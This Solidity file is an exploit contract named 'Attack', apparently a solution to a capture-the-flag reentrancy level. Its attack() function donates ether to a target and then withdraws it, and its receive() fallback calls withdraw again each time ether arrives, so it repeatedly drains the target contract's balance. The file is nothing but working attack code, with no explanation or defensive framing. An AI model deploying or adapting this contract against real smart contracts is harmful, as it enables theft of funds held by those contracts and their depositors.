// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Attack {
    IReentrance public target;
    address public owner;

    constructor(address _target) public {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        target.withdraw(0.001 ether);
    }
}